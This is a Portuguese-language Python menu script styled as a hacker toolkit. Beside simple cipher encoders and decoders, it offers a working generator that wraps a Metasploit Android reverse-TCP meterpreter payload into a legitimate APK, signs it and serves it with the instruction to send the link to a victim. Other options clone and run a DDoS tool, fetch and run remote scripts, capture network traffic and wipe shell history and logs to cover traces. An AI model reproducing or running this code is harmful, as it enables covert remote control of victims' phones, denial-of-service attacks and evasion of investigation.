import os
import time
import base64
import random

# Cores ANSI
VERDE = "\033[92m"
VERMELHO = "\033[91m"
AZUL = "\033[94m"
RESET = "\033[0m"

# Tabelas de apoio
MORSE = {
    'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.',
    'F': '..-.', 'G': '--.', 'H': '....', 'I': '..', 'J': '.---',
    'K': '-.-', 'L': '.-..', 'M': '--', 'N': '-.', 'O': '---',
    'P': '.--.', 'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-',
    'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-', 'Y': '-.--',
    'Z': '--..', ' ': '/'
}
MORSE_INV = {v: k for k, v in MORSE.items()}

# Interface
os.system("clear")
print(VERDE + r'''


                                                                                                                   
                                                                                                                   
                                                                                                                   
                                                                                                                   
                                                                                                                   
                                                                                                                   
                                                                                                                   
                                                                                                                   
                                                                                                                   
                                                                                                                   
                                                                                                                   
                                                                                                                   
                                                                                                                   
                                                                                                                   
                                                                                                                   
                                                    ████████████████████                                           
                                               ░██████                ██████                                       
                                            ░████                         ░████                                    
                                          ████                                ████                                 
                                        ████                          ▓         ████                               
                                      ▓███          ▒▓              █             ███░                             
                                     ███                  █                         ███                            
                                    ███                     █                        ███                           
                                   ██                        ▒  ░                     ▓██                          
                                  ██                      ███████▒██                   ▓██                         
                                 ██▓                       █████████                    ███                        
                                ███                       ████████                       ██▒                       
                                ██                       ███████                         ░██                       
                               ░██                      ██████                            ██                       
                               ███                     ███████                            ███                      
                               ██░                    ███████                             ███                      
                               ██                    ████████                             ░██                      
                               ██░                  ████▒███▓         ██                  ███                      
                               ███                █████ ████        █████                 ███                      
                               ░██               █████  ████     ▓████ ██                 ██                       
                                ███           ███████   ████  ░███████ ██                ░██                       
                                ████       ░████████    █████████████ ▒█░                ██▓                       
                                 ████   ░██████████░    ████████████  ██                ███                        
                                  ████░████████████          ▒█ ███  ▒█▓               ▒██                         
                                   ████████████████            ██                     ▒██                          
                                    █████████ ██░██         ▒███      █              ███                           
                                     ██████   ██ █████████▓     █                   ███                            
                                      ███▓    ░▒█                █                ███▒                             
                                        ███▓    █                █              ████                               
                                          ████  █                 █           ████                                 
                                            ▒████                 ░        ████░                                   
                                               ▒█████▓             █  ▓█████░                                      
                                                   ░████████████████████░                                          
                                                                                                                   

                                         
                     ___ ___   ___ ___ ___   ___   ___ ___   
                    |   |_  | |   |   |_  | |_  | |   |_  |  
                    | | |_| |_| | | | |_| |_ _| |_| | |_| |_ 
                    |___|_____|___|___|_____|_____|___|_____|
                                         
''' + RESET)

print(VERDE + '''
[1]-Descriptografar
[2]-Criptografar
[3]-Mudar IP
[4]-DDOS
[5]-Gerador de APK malicioso
[6]-Termos e Condições
[7]-Gerador de Codinome
[8]-Ferramentas Secretas
[9]-Reinstalar
[!]EMERGÊNCIA
''' + RESET)

resposta = input(VERMELHO + "Escolha  Sabiamente: " + RESET)

if resposta == "1":
    print(VERDE + '''
[1] Binário
[2] Morse
[3] HEX
[4] Substituição Monoalfabética
[5] Vigenère
''' + RESET)
    opcao = input(VERMELHO + "Opção: " + RESET)
    if opcao == "1":
        dado = input(VERMELHO + "Binário: " + RESET)
        print(VERDE + "Texto:", ''.join([chr(int(dado[i:i+8], 2)) for i in range(0, len(dado.replace(" ", "")), 8)]) + RESET)
    elif opcao == "2":
        dado = input(VERMELHO + "Morse (com ' / ' entre palavras): " + RESET)
        palavras = dado.strip().split(' / ')
        texto = ''
        for palavra in palavras:
            letras = palavra.split()
            for letra in letras:
                texto += MORSE_INV.get(letra, '?')
            texto += ' '
        print(VERDE + "Texto:", texto.strip() + RESET)
    elif opcao == "3":
        dado = input(VERMELHO + "HEX: " + RESET)
        hex_string = dado.replace(" ", "").replace("0x", "")
        print(VERDE + "Texto:", ''.join([chr(int(hex_string[i:i+2], 16)) for i in range(0, len(hex_string), 2)]) + RESET)
    elif opcao == "4":
        cifrado = input(VERMELHO + "Texto cifrado: " + RESET)
        chave = input(VERMELHO + "Chave (26 letras): " + RESET)
        alfabeto = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        chave = chave.upper()
        inverso = {chave[i]: alfabeto[i] for i in range(len(alfabeto))}
        print(VERDE + "Texto:", ''.join([inverso.get(c.upper(), c) for c in cifrado]) + RESET)
    elif opcao == "5":
        cifrado = input(VERMELHO + "Texto cifrado: " + RESET)
        chave = input(VERMELHO + "Palavra-chave: " + RESET)
        cifrado = cifrado.upper()
        chave = chave.upper()
        texto = ''
        for i in range(len(cifrado)):
            letra = cifrado[i]
            if letra.isalpha():
                k = chave[i % len(chave)]
                letra_real = chr(((ord(letra) - ord(k) + 26) % 26) + ord('A'))
                texto += letra_real
            else:
                texto += letra
        print(VERDE + "Texto:", texto + RESET)
    else:
        print(VERMELHO + "Opção inválida!" + RESET)

elif resposta == "2":
    print(VERDE + '''
[1] Binário
[2] Morse
[3] HEX
[4] Substituição Monoalfabética
[5] Vigenère
''' + RESET)
    opcao = input(VERMELHO + "Opção: " + RESET)
    if opcao == "1":
        dado = input(VERMELHO + "Texto: " + RESET)
        print(VERDE + "Binário:", ' '.join([format(ord(c), '08b') for c in dado]) + RESET)
    elif opcao == "2":
        dado = input(VERMELHO + "Texto: " + RESET)
        print(VERDE + "Morse:", ' '.join([MORSE.get(c.upper(), '?') for c in dado]) + RESET)
    elif opcao == "3":
        dado = input(VERMELHO + "Texto: " + RESET)
        print(VERDE + "HEX:", ' '.join([format(ord(c), '02X') for c in dado]) + RESET)
    elif opcao == "4":
        texto = input(VERMELHO + "Texto: " + RESET)
        chave = input(VERMELHO + "Chave (26 letras): " + RESET)
        alfabeto = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        chave = chave.upper()
        mapa = {alfabeto[i]: chave[i] for i in range(len(alfabeto))}
        print(VERDE + "Texto cifrado:", ''.join([mapa.get(c.upper(), c) for c in texto]) + RESET)
    elif opcao == "5":
        texto = input(VERMELHO + "Texto: " + RESET)
        chave = input(VERMELHO + "Palavra-chave: " + RESET)
        texto = texto.upper()
        chave = chave.upper()
        cifrado = ''
        for i in range(len(texto)):
            letra = texto[i]
            if letra.isalpha():
                k = chave[i % len(chave)]
                letra_cifrada = chr(((ord(letra) + ord(k) - 2 * ord('A')) % 26) + ord('A'))
                cifrado += letra_cifrada
            else:
                cifrado += letra
        print(VERDE + "Texto cifrado:", cifrado + RESET)
    else:
        print(VERMELHO + "Opção inválida!" + RESET)

elif resposta == "3":
    print(AZUL + "Instalando AutoTor..." + RESET)
    os.system("apt install git -y && git clone https://github.com/Toxic-Noob/AutoTor && cd AutoTor && bash termux-autotor.sh")

elif resposta == "4":
    print(AZUL + "Instalando Gamkers-DDOS..." + RESET)
    os.system("apt install git -y && git clone https://github.com/gamkers/Gamkers-DDOS && cd Gamkers-DDOS && chmod +x * && bash Gamkers-DDOS.sh")

elif resposta == "5":
    print("Executando gerador de APK malicioso...")
    import os
    import time

    os.system("clear")
    print("""
    ╔═══════════════════════════════════════════════╗
    ║     ☢️ FABRICA DE APKS CAMUFLADOS ☢️         ║
    ║        (Base: OpenCamera.apk)                 ║
    ║        Capitão SombraZero - Coronel GPT       ║
    ╚═══════════════════════════════════════════════╝
    """)

    # Inputs do usuário
    ip = input("[📡] Digite seu IP (LHOST): ")
    porta = input("[📦] Digite a PORTA (LPORT): ")
    apk_legitimo = input("[📁] Digite o nome do APK legítimo (ex: OpenCamera.apk): ")

    # Etapa 1 – Instalar ferramentas
    print("\n[🔧] Instalando ferramentas...")
    os.system("apt update && apt install -y default-jdk apktool zipalign wget metasploit")

    # Etapa 2 – Criar payload
    print("\n[💀] Criando trojan.apk com msfvenom...")
    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={porta} -o trojan.apk")

    # Etapa 3 – Descompilar
    print("\n[📦] Descompilando APKs...")
    os.system(f"apktool d {apk_legitimo} -o original")
    os.system("apktool d trojan.apk -o payload")

    # Etapa 4 – Copiar smali malicioso
    print("\n[🧬] Inserindo código malicioso...")
    os.system("cp -r payload/smali/com/metasploit original/smali/com/")

    # Etapa 5 – Editar MainActivity.smali automaticamente
    print("\n[🧠] Localizando MainActivity.smali...")
    main_path = os.popen("find original/smali -name '*MainActivity*.smali'").read().strip()

    if main_path:
        print(f"[✍️] Inserindo payload em {main_path}...")
        with open(main_path, "r") as file:
            lines = file.readlines()

        for i, line in enumerate(lines):
            if "onCreate(Landroid/os/Bundle;)V" in line:
                while i < len(lines):
                    if "invoke-super" in lines[i]:
                        lines.insert(i+1, "    invoke-static {}, Lcom/metasploit/stage/Payload;->start()V\n")
                        break
                    i += 1
                break

        with open(main_path, "w") as file:
            file.writelines(lines)
    else:
        print("[❌] MainActivity.smali não encontrado! Intervenção manual necessária.")
        exit()

    # Etapa 6 – Recompilar
    print("\n[🔁] Recompilando APK modificado...")
    os.system("apktool b original -o app_infectado.apk")

    # Etapa 7 – Assinar APK
    print("\n[🔏] Gerando chave e assinando APK...")
    os.system("keytool -genkey -v -keystore chave.keystore -alias camuflado -keyalg RSA -keysize 2048 -validity 10000 <<< $'senha\nsenha\nSombraZero\nCidade\nEstado\nBR\nSim\n'")
    os.system("jarsigner -verbose -keystore chave.keystore app_infectado.apk camuflado")

    # Etapa 8 – Alinhar
    print("\n[📐] Alinhando APK final...")
    os.system("zipalign -v 4 app_infectado.apk app_final.apk")

    # Etapa 9 – Servir
    print("\n[🌐] Iniciando servidor web...")
    print(f"[✅] Envie esse link para a vítima: http://{ip}:8080/app_final.apk")
    os.system("python3 -m http.server 8080")

elif resposta == "6":
    print(VERDE + '''
 Eu, agente voluntário da Ordem 01001101, declaro, sob minha consciência e responsabilidade, que:

1. Respeitarei o código da sombra, mantendo absoluto sigilo sobre as ferramentas, métodos e comunicações da ordem.
2. Usarei este sistema exclusivamente para fins educacionais, éticos e estratégicos.
3. Nunca revelarei minha identidade real durante operações.
4. Se capturado, ativarei o protocolo de emergência sem hesitar.
5. Agirei com inteligência, cautela e lealdade.
6. Jamais deixarei rastros que comprometam a missão.
7. Reconheço que o conhecimento é poder — e com ele, assumo o peso da responsabilidade.

01001101 não é um programa. É uma ideia.
''' + RESET)

elif resposta == "7":
    prefixos = ["Sombra", "Corvo", "Lobo", "Fantasma", "Vírus", "Sentinela"]
    sufixos = ["X", "404", "Zero", "14", "Phantom", "1NTRUD3R"]
    print(VERDE + "Codinome gerado:", random.choice(prefixos) + random.choice(sufixos) + RESET)

elif resposta == "8":
    print(VERDE + """
[8.1] Rastreador de perfis (OSINT)
[8.2] Sniffer de pacotes com tcpdump
[8.3] Spoofer de MAC (macchanger)
[8.4] Gerador de identidade falsa
[8.5] Criptografia em imagem (esteganografia)
[8.6] Navegador invisível (modo honeypot)
[8.7] Agenda secreta com anotações ocultas
[8.8] Kill Switch de arquivos e logs
""" + RESET)
    sub = input(VERMELHO + "Escolha a ferramenta: " + RESET)

    if sub == "8.1":
        usuario = input(VERMELHO + "Nome de usuário para investigar: " + RESET)
        os.system(AZUL + f"git clone https://github.com/sherlock-project/sherlock.git && cd sherlock && python3 sherlock.py {usuario}" + RESET)
    elif sub == "8.2":
        os.system(AZUL + "apt install tcpdump -y && sudo tcpdump -i any -w captura.pcap" + RESET)
    elif sub == "8.3":
        interface = input(VERMELHO + "Interface de rede (ex: wlan0): " + RESET)
        os.system(AZUL + f"sudo macchanger -r {interface}" + RESET)
    elif sub == "8.4":
        os.system(AZUL + "apt install w3m -y && w3m https://www.fakenamegenerator.com" + RESET)
    elif sub == "8.5":
        img = input(VERMELHO + "Imagem base (ex: foto.png): " + RESET)
        msg = input(VERMELHO + "Mensagem secreta: " + RESET)
        os.system("apt install steghide -y")
        with open("msg.txt", "w") as f:
            f.write(msg)
        os.system(AZUL + f"steghide embed -cf {img} -ef msg.txt" + RESET)
    elif sub == "8.6":
        os.system(AZUL + "apt install w3m -y && w3m https://duckduckgo.com" + RESET)
    elif sub == "8.7":
        os.system(AZUL + "nano .01001101_agenda" + RESET)
    elif sub == "8.8":
        confirm = input(VERMELHO + "Tem certeza? Todos os logs serão apagados [s/n]: " + RESET)
        if confirm.lower() == "s":
            os.system(AZUL + "sudo rm -rf ~/.bash_history ~/.zsh_history logs/ captura.pcap msg.txt" + RESET)
        else:
            print(VERDE + "Cancelado." + RESET)
    else:
        print(VERMELHO + "Opção secreta inválida." + RESET)

elif resposta == "9":
    print(VERDE + "Copie e cole este comando para ATUALIZAR o SISTEMA" + RESET)
    print(VERDE + "rm -rf 01001101" + RESET)
    print(VERDE + "git clone https://github.com/poh22-hacker/01001101.git" + RESET)

elif resposta == "!":
    print(VERMELHO + "⚠️ EMERGÊNCIA ATIVADA: Excluindo sistema..." + RESET)
    time.sleep(2)
    os.system("sudo rm -rf 01001101.py")
    print(VERDE + "Arquivo 01001101.py removido com sucesso." + RESET)

else:
    print(VERMELHO + "Opção inválida." + RESET)
